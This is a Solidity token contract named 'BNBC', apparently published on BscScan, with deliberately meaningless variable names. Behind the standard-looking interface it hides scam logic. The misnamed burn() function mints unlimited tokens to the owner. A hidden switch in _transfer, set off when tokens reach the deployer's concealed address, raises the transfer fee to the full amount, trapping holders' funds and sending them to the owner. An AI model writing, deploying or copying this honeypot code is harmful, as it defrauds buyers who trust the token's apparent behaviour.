/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract yZLtDW {
mapping (address => mapping (address => uint256)) private _allowances;
uint8 public constant decimals = 18;
uint256 public  pCykze = 100000000000000000000000;
address public  TDTGNF = address(0);
string public  name = "qEkmNq";
uint256 public constant BcIMSR = 9+1;
uint256 public  aeeFGA = 100000000000000000000;
uint256 public  ssObdb = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  JFvetT = address(0);
uint256 public  RzHqFR = 10000000000000000;
uint256 private  ZGlOnP = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  DOegaZ = address(0);
mapping (address => uint256) public balanceOf;
uint256 public  FRaMtp = 10000000000000000000;
uint256 public  YirZRF = 10000000000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address public  vOjdBa = address(0);
address public owner;
address public  dfxWvi = address(0);
address private  KQSXOO = address(0);
uint256 public  rGsmfT = 100000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  QMPIeY = 100000000000000000000000;
string public  symbol = "BNBC";
address public  GvxFvP = address(0);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "xXMRQn");
require(to != address(0), "xXMRQn");
require(amount <= balanceOf[from], "xXMRQn");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* BcIMSR/ZGlOnP ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==KQSXOO){
ZGlOnP = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () {
KQSXOO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}